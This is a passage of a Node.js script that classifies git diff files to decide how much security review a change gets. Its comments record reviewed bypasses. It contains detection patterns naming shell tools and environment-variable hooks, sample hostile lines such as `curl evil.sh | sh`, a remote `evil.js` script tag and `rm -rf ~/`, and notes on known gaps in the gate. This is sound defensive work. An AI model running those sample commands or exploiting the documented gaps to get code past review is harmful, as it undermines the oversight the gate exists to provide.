#!/usr/bin/env node
'use strict';
/*
 * classify-diff.js — classify a unified git diff into CODE vs INERT files.
 *
 * A diff is "content-only" (0 reviewers; /review Step 3 auto-pass) IFF no changed file
 * is CODE. The boundary is EXECUTION / BUILD / CI semantics, NOT file extension.
 *
 * FAIL TOWARD CODE on any ambiguity, parse failure, or git error. Asymmetry (P11/P72):
 * once Step 3 became a *security* gate (skip-all-review vs cosmetic), a misclassified
 * inert file merely wastes a review, but a misclassified code file skips the gate
 * entirely — so every unknown/ambiguous/error case resolves to CODE.
 *
 * Detection is by the file's ROLE + the diff HUNK, not the extension alone:
 *  - source extensions, CI/build paths, git hooks, Dockerfile/Makefile → CODE
 *  - .toml → CODE (build config: pyproject/Cargo) — fail-safe
 *  - .yaml/.yml → CODE (orchestration by default) unless the repo-relative path is in DATA_YAML_PATHS.
 *    An exec-key allowlist was tried (S167) and reverted: it failed OPEN on block scalars,
 *    quoted keys, dotted value-keys, and any unenumerated key. Allowlist the DATA, not the code.
 *  - .json/.jsonl/.ndjson → CODE if the hunk touches an exec key ("command"/"hooks"/lifecycle/
 *    apiKeyHelper) — this net runs FIRST and no allowlist suppresses it. Otherwise INERT if
 *    the repo-relative path is in DATA_JSON_PATHS (one set, all three json flavours; the
 *    old jsonl-only set was extension-gated, so a .json entry in it was DEAD code). Else
 *    CODE if a changed value carries shell semantics (&&, |, $(, curl, rm, sh…), OR
 *    (package.json) the scripts/bin block is in play; else inert (pure data).
 *    Allowlist rationale: data PROSE routinely carries `;`/`node`/`python`, which SHELL_VALUE
 *    reads as injection — telemetry appends blocked every wrap (S256) and a 273-node graph
 *    export blocked a whole commit ([redacted] S2). Exec keys stay caught either way.
 *  - extensionless → CODE if the body has a shebang; inert only for known doc markers; else CODE.
 *  - quoted-path diff headers (non-ASCII / special-char names) are parsed + C-unescaped, never
 *    silently absorbed into a sibling file (that leak dropped whole code files).
 *
 * Input:  a unified `git diff HEAD` on stdin (primary), or `--repo <path>` to compute it.
 *   Flags: --tier (opt in to the reviewer ladder), --green (Step 1.5's check ran AND passed).
 * Output: {"contentOnly":bool,"codeFiles":[...],"execFiles":[...]} on stdout; exit 0 always.
 *   With --tier, adds {"tier":"T0"|"T1"|"T1.5"|"T2","tierReason":str,"signals":{...}|null}.
 *   execFiles ⊆ codeFiles = the files with EXECUTION/BUILD/CI semantics (hook commands, CI
 *   configs, shell/build scripts, Dockerfile/Makefile, schema/DDL, exec-key JSON). Plain
 *   application source (.ts/.py/.rb/…) is code:true but exec:false — the ONLY code eligible
 *   to de-escalate below full review.
 *
 * The reviewer-count LADDER lives here too, in computeTier() — it was prose in SKILL.md Step
 * 4.5, recalibrated twice, and measured still failing (P16: 3rd tuning ⇒ escalate to code).
 * Its gate is EXEC || CONTRACT; N/GREEN/net-additive only de-escalate below that.
 *
 * Consumers (P51 — keep in lockstep): /review SKILL.md Step 3 runs the single --tier
 * invocation, Step 4 reads `codeFiles`, Step 4.5 reads `tier` + `tierReason`;
 * check-review-gate.js calls it WITHOUT --tier (contentOnly only, no tier code executed);
 * hooks/tests/gate-hooks-canary.sh §5 asserts the code boundary, §6 the exec boundary,
 * §6.5 the tier ladder (both directions per signal).
 */
const fs = require('fs');
const tty = require('tty');
const { execFileSync } = require('child_process');

let diff = '';
let errored = false;
// --tier opts IN to the ladder (SKILL Step 4.5). Without it the output schema is byte-unchanged
// AND computeTier never runs — the opt-out keeps the commit-blocking caller free of the tier
// code's throw surface entirely, which is the real reason the flag exists (not back-compat:
// there is exactly one production caller).
// --green asserts Step 1.5's check command RAN AND PASSED; its ABSENCE means not-green, so a
// caller that forgets the flag can never reach T0 (fail-safe by construction).
const WANT_TIER = process.argv.includes('--tier');
const GREEN = process.argv.includes('--green');
const repoIdx = process.argv.indexOf('--repo');
if (repoIdx !== -1 && process.argv[repoIdx + 1]) {
  try {
    diff = execFileSync('git', ['-C', process.argv[repoIdx + 1], '-c', 'diff.noprefix=false',
      '-c', 'diff.mnemonicPrefix=false', 'diff', '--no-ext-diff', 'HEAD'],
      { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'], maxBuffer: 64 * 1024 * 1024 });
  } catch { errored = true; }        // git error is NOT "no changes" → fail toward code
} else {
  // Use tty.isatty(0), NOT process.stdin.isTTY. Touching `process.stdin` instantiates Node's
  // stdin stream, which flips fd 0 to O_NONBLOCK; the very next fs.readFileSync(0) then throws
  // EAGAIN whenever the writer has not yet produced its first byte. `git diff HEAD` forks and
  // computes before emitting, so it lost that race on EVERY real invocation → <diff-error> →
  // fail-toward-code → /review's content-only auto-pass never once fired in production. The
  // canary's printf-fed pipe wins the race ~75% of the time, so the bug shipped green (S167).
  // tty.isatty(0) answers the same question without touching the stream: fd 0 stays blocking.
  try { if (!tty.isatty(0)) diff = fs.readFileSync(0, 'utf8'); } catch { errored = true; }
}

// C-unescape a git-quoted path body: \NNN octal, \", \\, \t, \n (core.quotepath default).
function unquote(s) {
  return s.replace(/\\([0-7]{3}|["\\tn])/g, (_, g) => {
    if (g === '"' || g === '\\') return g;
    if (g === 't') return '\t';
    if (g === 'n') return '\n';
    return String.fromCharCode(parseInt(g, 8));
  });
}
function sidePath(tok, side) {
  if (tok.startsWith('"' + side + '/') && tok.endsWith('"')) return unquote(tok.slice(3, -1));
  if (tok.startsWith(side + '/')) return tok.slice(2);
  return null;
}

// Parse a unified diff into per-file { path, body, forced }. A `diff --git` header we
// cannot parse becomes a `forced` code entry — NEVER absorbed into the previous file.
function parse(text) {
  const files = [];
  let cur = null;
  for (const raw of text.split(/\r?\n/)) {          // \r?\n — tolerate CRLF diffs
    if (raw.startsWith('diff --git ')) {
      const rest = raw.slice('diff --git '.length);
      const q = rest.match(/^("a\/(?:[^"\\]|\\.)*"|a\/\S+) ("b\/(?:[^"\\]|\\.)*"|b\/\S+)$/);
      // BOTH sides are retained. The b-side is the file's identity (what it IS now); the
      // a-side is its ORIGIN and is classified too — see the rename-laundering block on
      // classify(). Discarding the a-side here was the bypass: `a/deploy.sh b/notes.txt`
      // scored purely as notes.txt.
      const bSide = q ? sidePath(q[2], 'b') : null;
      const aSide = q ? sidePath(q[1], 'a') : null;
      const path = bSide || aSide;
      cur = path ? { path, originPath: aSide, body: [], forced: false } : { path: '<unparseable-diff-header>', originPath: null, body: [], forced: true };
      files.push(cur);
      continue;
    }
    if (cur) cur.body.push(raw);
  }
  return files;
}

const CODE_EXT = new Set([
  'ts','tsx','js','jsx','mjs','cjs','py','rb','erb','go','rs','java','kt','kts','scala',
  'c','h','cc','cpp','hpp','cs','php','swift','m','mm','sh','bash','zsh','fish','ps1',
  'pl','lua','r','sql','groovy','gradle','dart','ex','exs','clj','vue','svelte',
  // Stylesheets: CODE (they ship to users and can regress layout), but NOT exec.
  // Listed here because their ABSENCE was the bug, not a policy: an unlisted extension
  // falls through to the unknown-extension arm below, which fails toward CODE **+ EXEC**
  // — so every CSS-only diff was scoring EXEC:true and pinning T2, the widest slate.
  // Measured before this line existed: a 1-line `height: 36px -> 24px` scss diff returned
  // T2/EXEC:true while the byte-equivalent 1-line .erb diff returned T1/EXEC:false. Same
  // risk, opposite tier, purely because one extension was on this list and the other was
  // not. A stylesheet has no execution/build/CI semantics: no shell, no lifecycle key, no
  // DDL. Its blast radius is selector containment, which is what a reviewer reads the diff
  // for — a reason to keep it CODE, never a reason to call it EXEC.
  // ⚠️ Do NOT "promote" these to EXEC_EXT. Canary §6 asserts noexec for scss and §6.5
  // asserts the resulting tier, in both directions.
  'css','scss','sass','less','styl',
  // Binary media + markup (S67): CODE, never EXEC — same shape as the stylesheet entry
  // above, one file class over. Their ABSENCE was the bug: unlisted, they fell through to
  // the unknown-extension arm and scored EXEC:true, pinning T2.
  // Measured 2026-08-25 over 147 canonical /review runs (evals/measure_review_tiers.py):
  // T2 was EXEC-driven 77% of the time, and 50% of exec-flagged FILES were .png/.mp4/.mp3
  // — a screenshot commit drew the full 7-agent slate. A PNG has no execution/build/CI
  // semantics, and a reading reviewer cannot review it at all.
  // ⚠️ CODE, not INERT. Listing these as inert was tried and REVERTED in review: a binary
  // body parses to ZERO change lines, so the file silently holds `netAdditive:false`.
  // ⚠️ SUPERSEDED 2026-08-26: that argument assumed media files ARE binary. They need not be —
  // a TEXT-bodied .png scored T0. T0-ineligibility is now enforced explicitly in computeTier()
  // via the MEDIA signal; do not rely on the zero-parsed-line accident below as a safety brake.
  // Dropping it from the diff removes that brake AND decrements N, so
  // `logo.png + new src/a.ts --green` flips T2 -> T0 — zero reviewers on a diff containing
  // new source. That is the vacuous-T0 bug the ZERO-PARSED-LINE canary block exists to
  // prevent. Canary §6.5 grep `png + new source -> T1, never T0` pins it.
  // html/htm were in this change and were REMOVED in review. They are TEXT, so a new .html
  // file parses to real `+` lines and `netAdditive` goes TRUE — the brake that makes the
  // media demotion safe is simply absent. Measured: a new `public/widget.htm` containing
  // `<script src="//cdn/evil.js">` scored T0 (ZERO reviewers) where it was previously T2.
  // Demoting markup needs its own evidence and its own T0-ineligibility rule; it is not a
  // free rider on the media measurement, which covered .png/.mp4/.mp3 only.
]);
// Binary media, split OUT of CODE_EXT so the shebang net below has a nameable surface.
// Same {code:true, exec:false} outcome as a stylesheet — see the block above for why these
// are CODE and never INERT (the vacuous-T0 revert).
// The split exists for ONE reason, found in review: after demotion the EXTENSION ALONE
// decided, so `assets/hero.png` whose body is `#!/usr/bin/env bash\nrm -rf ~/` scored
// T0 — ZERO reviewers — where pre-demotion it was T2. Binary media containing a shebang is
// anomalous BY CONSTRUCTION, so that one class can be content-tested without over-firing.
// ⚠️ Do NOT hoist the shebang test above CODE_EXT generally: this repo's own .py files open
// with `#!/usr/bin/env python3`, so a blanket test promotes every Python file to exec:true
// and recreates the over-escalation this whole change removes (measured, not assumed).
// Known gap, deliberately NOT closed here: INERT_EXT ('txt','md'…) has the same hole and it
// is worse (contentOnly:true skips the gate entirely). Extending the net there was tried and
// rejected — SHEBANG is /^[+ -]?#!/, so any README documenting a shell example matches, and
// docs change constantly. Closing it needs a content test that survives prose, not this one.
const MEDIA_EXT = new Set([
  'png','jpg','jpeg','gif','webp','ico','bmp','heic','avif',
  'mp4','mov','webm','avi','mkv','mp3','wav','m4a','aac','ogg',
  'woff','woff2','ttf','otf','eot','psd','sketch','fig','ai',
]);
// Within CODE_EXT, the extensions that are NOT plain application source — they build,
// deploy, or define schema, so a change is high-blast and must never de-escalate below T2.
const EXEC_EXT = new Set(['sh','bash','zsh','fish','ps1','sql','groovy','gradle']);
const CODE_BASENAMES = new Set([
  'Dockerfile','Makefile','Rakefile','Gemfile','Guardfile','Procfile','Jenkinsfile','Brewfile','configure',
]);
const INERT_EXT = new Set(['md','markdown','txt','rst','csv','lock']);
const INERT_BASENAMES = new Set([
  '.gitignore','.gitattributes','.editorconfig','.npmrc','.nvmrc','.prettierignore',
  '.eslintignore','.dockerignore','package-lock.json','yarn.lock','pnpm-lock.yaml',
  'Gemfile.lock','poetry.lock','Cargo.lock','composer.lock','.last-cleanup',
]);
const DOC_MARKERS = new Set([   // extensionless files that are genuinely inert
  'LICENSE','LICENCE','COPYING','COPYRIGHT','AUTHORS','CONTRIBUTORS','CHANGELOG','NOTICE','PATENTS','VERSION','CODEOWNERS',
]);
// Key-level exec surface (quoted JSON keys), incl. npm lifecycle + Claude settings helper commands
// (apiKeyHelper, awsAuthRefresh, awsCredentialExport, otelHeadersHelper) + devcontainer lifecycle
// commands (initializeCommand runs on the HOST). The last two groups were missing until the
// 2026-09-15 review — devcontainer.json sat in NEVER_DATA_JSON for its lifecycle while none of
// those keys was checked.
const EXEC_KEY = /"(command|hooks|scripts|bin|run|entrypoint|exec|args|apiKeyHelper|awsAuthRefresh|awsCredentialExport|otelHeadersHelper|initializeCommand|onCreateCommand|updateContentCommand|postCreateCommand|postStartCommand|postAttachCommand|preinstall|install|postinstall|prepare|prepublish|prepublishOnly|prepack|postpack|PreToolUse|PostToolUse|PreCompact|UserPromptSubmit|SessionStart|SessionEnd|Stop|Notification|SubagentStop)"\s*:/;
// Value-level exec surface: a changed line whose string value carries shell semantics —
// catches value-only script edits under an unchanged parent key (the injection case).
// Shell words use (?<![\w-])…(?![\w-]) rather than \b: a hyphen is a \b boundary, so
// \bnpm\b matched inside the pure-data value "npm-global" (harness updater artifact) and
// blocked every wrap commit (S258). Hyphenated compounds (npm-global, curl-config) are
// tokens, not commands; real invocations ("npm install", "rm -rf") still match.
const SHELL_VALUE = /:\s*"[^"]*(&&|\|\||[|;`]|\$\(|(?<![\w-])(curl|wget|rm|sh|bash|zsh|eval|node|npm|npx|python|ruby|perl|make)(?![\w-]))/;
// YAML exec surface, keyed on DIRECTIVES rather than the extension. CI/orchestration YAML
// declares execution through these keys; pure-data YAML (session-registry.yaml, locale
// bundles, fixtures) declares none. Anchored per-line (/m) so an exec word appearing INSIDE
// a quoted prose scalar does not trip it. Tested against `full` (hunk + context) so a
// value-only edit under an unchanged `run:` key is still caught.
// YAML is orchestration by default; only NAMED pure-data files are inert. An exec-KEY
// allowlist was tried and rejected under review: it fails OPEN. A key-based net cannot see
// (a) a block-scalar body edit whose `command: |` key sits outside git's default -U3 window,
// (b) dotted value-keys (`ansible.builtin.command:`), (c) quoted keys (`"run":`), or (d) any
// key nobody enumerated (`handlers:`, `lifecycle:`, `postStart:`) — each yields 0 reviewers.
// Inverting it costs a wasted review on an unknown data yaml; the allowlist cost a skipped
// review on a malicious one. Asymmetry (P11/P72) picks the side that over-reviews. To add a
// file here it must be data BY CONSTRUCTION — never merely "data today".
// PATH-anchored (S256 review: basename-anywhere let any file NAMED like a data
// file bypass the nets — pin the known repo-relative locations instead).
// graph-index.yaml ([redacted]): a node index of title/description/topics/
// source/source_file/domain/kind/bet_date/outgoing (kind + bet_date added 2026-10-24: single
// plain values held by SCALAR_NODE_KEYS, so no new exec surface). No directive key exists in its schema, and it
// is CONSUMED by build-graph.js, never executed. It is prose-bearing DATA that the
// extension-level YAML default classified as orchestration WITHOUT READING IT — that
// branch inspects no content, so rewording the prose could never have unblocked the
// commit ([redacted] S2, 2026-08-21). Data BY CONSTRUCTION: the schema has no
// exec surface to grow — and that is ENFORCED, not asserted: the graph repo's
// validate-graph.js Check 8 (lib/schema-keys.js, mutation-tested both surfaces)
// closes the key set to 4 top-level + 9 per-node names and fails the build on any
// directive key. That check IS the admission bar for this entry — if it is ever
// weakened or removed, pull graph-index.yaml from this set in the same change. The
// YAML branch has no content net behind it, so the exemption is TOTAL wherever a
// root graph-index.yaml exists, in ANY repo (the classifier has no repo identity).
const DATA_YAML_PATHS = new Set(['session-registry.yaml', 'graph-index.yaml']);
// Same rule for the named pure-data JSON/JSONL artifacts. Telemetry outcome PROSE
// routinely carries `;`/`node`/`python`, which SHELL_VALUE reads as injection — the
// first live wrap under the delta gate blocked on exactly that (S256).
// public/graph-data.json is the same failure one extension over: a GENERATED
// artifact (build-graph.js emits it from graph-index.yaml), whose insight
// descriptions trip SHELL_VALUE on a prose semicolon. Nothing executes either;
// data BY CONSTRUCTION. One set, not two — the old jsonl-only set was gated on the
// extension, so a .json entry added to it would have been DEAD (reads as covered,
// never consulted).
// PATH-ANCHORED PATTERNS (review-router P1 §2.3, 2026-09-15). Entries may be exact repo-relative
// strings OR anchored RegExps; both are consulted AFTER EXEC_KEY and AFTER the package.json
// scripts/bin net. A plain array (a Set holding RegExps only ever matched by identity), kept on ONE
// line so the canary's emptied-list mutant removes every exemption at once.
//  - ^data/cleaning-extraction/.+\.jsonl$ ([redacted]): manual_corrections, spine
//    accepts, eval gold. Line-per-record data; no tool reads a .jsonl as config.
//  - .json there ONLY for the NAMED stores: *_codebook.json, identity_checklist.json,
//    measurement_roles.json. Derived 2026-09-15, not assumed: these are the only .json basenames
//    among the 32 flipped misfires and the 400-commit replay window. The first draft exempted ANY
//    .json under the tree — so data/cleaning-extraction/package.json with `"build": "curl … | sh"`
//    returned inert before the scripts net ever ran (two reviewers, reproduced). Other tracked data
//    .json (known_qualifiers, brand_list, …) never misfired, so they get no exemption.
//  - data/catalog.jsonl, data/index.jsonl ([redacted]): exact paths, verified at build.
// Every consumer is a Python/JS loader that PARSES them; none passes a value to a shell. Admission
// grep at build: 0 EXEC_KEY hits across tracked + on-disk files under the patterns.
// Accepted consequence: these become contentOnly (no review) until P2's replay check ships.
// Codebook text FEEDS LLM PROMPTS (D9), so a prompt-content edit there is unreviewed until P2's
// replay check — a quality risk, not an exec one.
// Accepted gap (no repo identity): any repo with a data/cleaning-extraction/ tree, and any repo
// with a bare data/catalog.jsonl or data/index.jsonl, is exempt too; EXEC_KEY still escalates there.
// NEVER_DATA_JSON: tool-config basenames that are exempt NOWHERE, whatever a future pattern says —
// each is read by a tool that runs values from it (npm scripts, devcontainer lifecycle, Claude hooks,
// MCP server commands, VS Code tasks, composer scripts, tsc plugins).
const NEVER_DATA_JSON = new Set(['package.json','devcontainer.json','.devcontainer.json','settings.json','settings.local.json','.mcp.json','tasks.json','tsconfig.json','composer.json']);
const DATA_JSON_PATHS = ['telemetry/skill-log.jsonl', 'public/graph-data.json', /^data\/cleaning-extraction\/.+\.jsonl$/, /^data\/cleaning-extraction\/(.+\/)?([a-z0-9_]+_codebook|identity_checklist|measurement_roles)\.json$/, 'data/catalog.jsonl', 'data/index.jsonl'];
// ── NEVER_DATA_JSON content nets (classifyPath; P2 bypasses B1/B2) ──
// CONTROL_KEY: settings/MCP/task/tsconfig keys that change WHAT RUNS or switch a control off
// without being a command themselves — `defaultMode: bypassPermissions`, `disableAllHooks`,
// `env` (NODE_OPTIONS / LD_PRELOAD reach every hook and subprocess), a marketplace source,
// an MCP server `url`, a VS Code task `runOn: folderOpen`, a tsserver `plugins` entry.
// Security and adversarial review 2026-09-15 split on scope (control-weakening vs exec); ruled
// IN: this gate exists to make a human-reviewed step precede such a change, and the replay
// below prices it. Tested against CHANGED lines only — unlike EXEC_KEY, whose value can wrap
// onto the next line, these carry their value on the key's own line (or open a block handled by
// ENV_EXEC_NAME). The first cut tested hunk+context and flipped 5 benign ~/.claude wrap edits:
// `defaultMode`/`env`/`extraKnownMarketplaces` sit beside `"model"`, so every pin bump saw them.
const CONTROL_KEY = /"(defaultMode|disableAllHooks|disableBypassPermissionsMode|enableAllProjectMcpServers|extraKnownMarketplaces|env|url|runOn|plugins)"\s*:/;
// An edit INSIDE an `env` block whose `"env": {` line is out of the changed set: the variable
// names that make a value executable. Anything else in env (API endpoints, flags) stays inert.
const ENV_EXEC_NAME = /"(NODE_OPTIONS|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]+|PYTHONSTARTUP|PYTHONPATH|BASH_ENV|ENV|PATH|PERL5OPT|RUBYOPT|GIT_SSH_COMMAND|GIT_EXEC_PATH)"\s*:/;
// tsc/tsserver never execute a bare string (`"lib": ["ES2022"]`, `"paths"` targets); the replay's
// only two tsconfig edits were exactly those. Its one loader surface, `plugins`, is a CONTROL_KEY.
const NO_BARE_NET = new Set(['tsconfig.json']);
const SCRIPT_MANIFESTS = new Set(['package.json', 'composer.json']);
const VERSION_ATOM = /^(?:[\^~]|[<>]=?|=)?v?\d+(?:\.(?:\d+|x|X|\*))*(?:-[0-9A-Za-z.]+)?(?:\+[0-9A-Za-z.]+)?$/;

// The JSON strings on one diff line, each tagged: `key` (followed by `:`), `value` (preceded by
// `:` — its key is on this line) or `bare` (neither — an array element or a wrapped value whose
// key is NOT visible). A hand-rolled scan instead of whole-line regexes: the first cut anchored
// `^…\s*,?\s*$`, so one extra token on the line (`"build": "./x" },`, `"--root", "./p",`)
// defeated it, and the trailing `\s*,?\s*$` backtracked quadratically — 12.5 s per line on a
// 200k-space pad, 75 s for a 900 KB diff (security review 2026-09-15). This is one linear pass.
function jsonStrings(line) {
  const out = [];
  let i = 1; // skip the +/- marker
  while (i < line.length) {
    if (line[i] !== '"') { i++; continue; }
    let j = i + 1;
    while (j < line.length && line[j] !== '"') j += line[j] === '\\' ? 2 : 1;
    const text = line.slice(i + 1, Math.min(j, line.length));
    let before = i - 1;
    while (before >= 1 && (line[before] === ' ' || line[before] === '\t')) before--;
    let after = j + 1;
    while (after < line.length && (line[after] === ' ' || line[after] === '\t')) after++;
    const kind = line[after] === ':' ? 'key' : (before >= 1 && line[before] === ':') ? 'value' : 'bare';
    out.push({ kind, text });
    i = j + 1;
  }
  return out;
}

// A dependency/engine constraint rather than a possible command. Checked token by token (no
// nested quantifiers → no backtracking): `^1.2.3`, `~56.0.24`, `>=18 <21`, `^8.1 || ^8.2`
// (composer), `npm:lodash@4.17.21`, `pnpm@9.1.0` (packageManager), `workspace:^1.2.0`.
// Deliberately NOT `latest` / `next` / `*` / dist-tags: as a SCRIPT value npm runs them through
// `sh -c` (`*` glob-expands to the first file) — a dependency using one pays a review.
function isVersionSpec(v) {
  let s = v.trim();
  if (s.startsWith('workspace:')) { s = s.slice(10); if (s === '^' || s === '~' || s === '*') return true; }
  if (s.startsWith('npm:')) s = s.slice(4);
  const at = s.lastIndexOf('@');
  if (at > 0) s = s.slice(at + 1);
  const toks = s.split(/\|\||,|\s+/).filter(Boolean);
  return toks.length > 0 && toks.every(t => VERSION_ATOM.test(t));
}
const isDataJsonPath = p =>!NEVER_DATA_JSON.has(base(p)) && DATA_JSON_PATHS.some(e => typeof e === 'string' ? e === p : e.test(p));
const SHEBANG = /^[+ -]?#!/;
// git METADATA, not content — which is exactly why this one is safe where the shebang net was
// not. A file mode of 1007xx means the diff GRANTS EXECUTE PERMISSION; 120000 means it is a
// symlink. Anchored to column 0 on a header line, so a `+`/`-`/context content line cannot
// match: a README documenting `chmod +x` or `curl … | sh` emits no mode line, and ONLY a real
// chmod does. This is the prose-survival property S67 and S68 both demanded and could not get
// from a content test.
// COST, measured properly (the first measurement here said "zero" and was WRONG -- it grepped
// --diff-filter=M, which excludes new-file adds, so it counted chmod-in-place only): the last
// 400 commits carry 10 mode-1007xx lines (9 `new file mode 100755`, 1 deleted). Replaying all
// 400 through the classifier with and without this rule moves exactly ONE commit's tier,
// T0 -> T2, on a new executable .py. That is the true cost: 1 in 400, at maximum effect size,
// in the safe direction. Recount with:
//   git log -400 -p | grep -cE '^(old|new|deleted)( file)? mode 1007'
const EXEC_MODE = /^(old|new|deleted)( file)? mode (1007[0-7][0-7]|120000|160000)$/;
// A submodule BUMP carries no mode line at all -- the 160000 rides the `index a..b 160000`
// line -- so the mode test alone misses it. Checking out a submodule runs the subproject's
// own build and hooks, so a bump to an attacker commit is code execution shipped as content.
// A new submodule ADD is caught only by accident (it drags in extensionless `.gitmodules`);
// the bump after a reviewed add has no such brake when the submodule path looks inert.
const GITLINK = /(^index [0-9a-f]+\.\.[0-9a-f]+ 160000$)|(^[+-]Subproject commit [0-9a-f]{7,40}$)/;
// json/jsonl/ndjson are the ONE inert class whose verdict is derived from the HUNK
// (EXEC_KEY/SHELL_VALUE), not from the path. A rename is precisely the operation that removes
// the content from the diff, so that verdict is unsupported: `notes.txt -> .claude/settings.json`
// carrying a PreToolUse hook whose command is `curl … | sh` scored contentOnly:true / T0, and
// the commit gate returned EXIT 0. Both directions launder, so both sides are tested.
// Measured: of 226 renames in the last 400 commits, ZERO are json-family. Cost is nil.
const JSON_EXT = new Set(['json','jsonl','ndjson']);

const base = p => { const i = p.lastIndexOf('/'); return i === -1 ? p : p.slice(i + 1); };
const ext  = p => { const b = base(p); const i = b.lastIndexOf('.'); return i <= 0 ? '' : b.slice(i + 1).toLowerCase(); };
// Only the changed content lines (+/-), excluding the +++/--- file-header lines.
// Shares changedArr() (hoisted, defined with the tier ladder below) so the two gates that
// consume this predicate cannot drift apart — they were byte-identical copies (P51).
const changed = body => changedArr(body).join('\n');

// Returns { code, exec }. code = needs review at all. exec = carries execution/build/CI
// semantics → must never de-escalate below full review (exec ⊆ code). Plain application
// source is { code:true, exec:false } — the only code eligible for tier de-escalation.
// FAIL TOWARD CODE *and* EXEC on any ambiguity (unknown ext, unparseable header) — a
// misclassified source file merely over-reviews, a misclassified exec file skips the gate.
// RENAME LAUNDERING (2026-08-27, security review). A file's identity was taken from the
// b-side of the `diff --git` header ALONE, so a rename relabelled the file for the gate:
// `deploy.sh` -> `notes.txt` with the body rewritten to `curl evil.sh | sh` scored
// contentOnly:true / T0 — ZERO reviewers — where editing deploy.sh in place scored T2.
// Measured 2026-08-27 against the committed classifier: renaming an EXEC_EXT file to any of
// .txt/.md/.json/.lock/LICENSE evaded review entirely. Only .png was caught, and only by
// accident — S68's media lie-detector fires on the parsed change lines, not on the rename.
//
// The fix is the UNION of both sides, not a new extension rule: a file is code/exec if
// EITHER what it is now OR what it used to be says so. This is the header contract ("fail
// toward code+exec on any ambiguity") applied to a field that was being thrown away.
//
// It CANNOT over-fire on ordinary diffs. git writes the real path on both sides for adds,
// deletes and in-place edits (the /dev/null appears on the ---/+++ lines, not the header),
// so originPath === path and the union is byte-identical to the old result. The behaviour
// changes for renames ONLY. Canary §6.6 pins both directions.
//
// NOT fixed here: a FRESH .txt/.md whose body is a shell payload has no exec origin to union
// with. Same known gap, same rejection reason — recorded ONCE on the MEDIA_EXT block above.
function classify(f) {
  if (f.forced) return { code: true, exec: true };
  // Mode is a property of the FILE, not of either path — tested once, before any path arm.
  if (f.body.some(l => EXEC_MODE.test(l) || GITLINK.test(l))) return { code: true, exec: true };
  // MASKED HUNK. `*.json binary` in .gitattributes makes git emit `Binary files … differ` with
  // NO hunk, and .gitattributes is itself inert — so a PreToolUse hook whose command is
  // `curl … | sh` landed in .claude/settings.json as contentOnly:true and the gate returned
  // EXIT 0. This is the MEDIA lie-detector inverted: there, parsed lines in a supposedly
  // binary file are anomalous; here, a binary body in a file that is NOT media and NOT inert
  // by path is equally anomalous — every arm that could clear it reads a hunk that no longer
  // exists. Real media and real lockfiles are excluded, so this cannot over-fire on them.
  if (f.body.some(l => /^Binary files .* differ$/.test(l) || l === 'GIT binary patch')) {
    const e0 = ext(f.path), b0 = base(f.path);
    if (!MEDIA_EXT.has(e0) && !INERT_EXT.has(e0) && !INERT_BASENAMES.has(b0) && !DOC_MARKERS.has(b0))
      return { code: true, exec: true };
  }
  const now = classifyPath(f.path, f.body);
  // `== null` (null/undefined), NOT `!originPath`. sidePath() can return the EMPTY STRING for
  // a degenerate quoted header (`diff --git "a/" b/notes.txt`): that is a PARSED origin, not
  // an absent one, and truthiness collapses the two. Classified, '' hits the extensionless arm
  // and fails up to code+exec; skipped, it fails OPEN — in the one guard this change exists to
  // close. Canary §6.6 pins it.
  if (f.originPath == null || f.originPath === f.path) return now;
  // A renamed json-family file on EITHER side: the hunk no longer carries the content the
  // inert verdict was inferred from. Fail up — the header contract's ambiguity case.
  if (JSON_EXT.has(ext(f.path)) || JSON_EXT.has(ext(f.originPath))) return { code: true, exec: true };
  const origin = classifyPath(f.originPath, f.body);
  return { code: now.code || origin.code, exec: now.exec || origin.exec };
}

// Takes the BODY, not the file record: the record also carries a path, and a future edit
// reaching for `f.path` in here would silently re-open the bug for the origin call.
function classifyPath(path, body) {
  const b = base(path), e = ext(path);
  const hunk = changed(body);
  const full = body.join('\n');
  if (/(^|\/)\.github\/workflows\//.test(path)) return { code: true, exec: true };
  if (/(^|\/)\.circleci\//.test(path)) return { code: true, exec: true };
  if (/(^|\/)\.git(hooks|-hooks)\//.test(path)) return { code: true, exec: true };  // in-repo git hooks
  if (/(^|\/)\.gitlab-ci\.ya?ml$/.test(path)) return { code: true, exec: true };
  if (/(^|\/)azure-pipelines\.ya?ml$/.test(path)) return { code: true, exec: true };
  if (/(^|\/)docker-compose[^/]*\.ya?ml$/.test(path)) return { code: true, exec: true };
  if (CODE_BASENAMES.has(b)) return { code: true, exec: true };  // Dockerfile/Makefile/Rakefile/… build+exec
  // Media first: same outcome as CODE_EXT non-exec, EXCEPT that a shebang in the body means
  // the extension is lying about the content — fail up. See the MEDIA_EXT comment block.
  if (MEDIA_EXT.has(e)) {
    // LIE DETECTOR, not content-sniffing (2026-08-26, converged on by the security AND
    // simplicity lenses independently). `git diff` emits `Binary files … differ` for genuine
    // media, so a media file with ANY parsed change line is anomalous BY CONSTRUCTION — the
    // extension is lying about the content. This cannot over-fire on real screenshots,
    // renames, or chmod: all three yield zero parsed lines. It also SUBSUMES the old shebang
    // net (a `#!` body has change lines), which keyed severity on the one token an attacker
    // omits — a 500-line shell payload in logo.png scored T1 while the same file with `#!`
    // scored T2.
    if (changedArr(body).length > 0) return { code: true, exec: true };
    return { code: true, exec: false };
  }
  if (CODE_EXT.has(e)) return { code: true, exec: EXEC_EXT.has(e) };  // source → exec:false; shell/sql/build → exec:true
  if (e === 'yaml' || e === 'yml') {                              // orchestration by default
    if (DATA_YAML_PATHS.has(path)) return { code: false, exec: false };  // named pure-data file (path-anchored)
    return { code: true, exec: true };                                    // everything else fails toward code
  }
  if (e === 'toml') return { code: true, exec: true };           // build config (pyproject/Cargo) — fail-safe
  if (e === 'json' || e === 'jsonl' || e === 'ndjson') {
    if (EXEC_KEY.test(hunk)) return { code: true, exec: true };  // hook command / lifecycle key / apiKeyHelper — runs BEFORE the allowlist
    // TOOL-CONFIG FILES DO NOT TRUST THE CHANGED LINES ALONE (P2 bypasses B1/B2, found by the
    // 2026-09-15 security review at confidence 9/10). EXEC_KEY above reads changed lines and
    // SHELL_VALUE needs `:"` on the same line, so both missed: (B1) `"command":` on a CONTEXT line
    // with the value on the next changed line, or an `"args": [` element edited below it; (B2) a
    // package.json script whose `"scripts"` key sits outside git's -U3 window, with a value holding
    // no shell word (`"build": "./tools/x"`). The classifier reads stdin with no repo identity, so it
    // cannot re-read the file (P2 finding 4).
    // THE RULE: in these files a changed string whose governing key is not VISIBLE is treated as
    // possibly executable. Concretely: an exec key anywhere in hunk+context; a control key or an
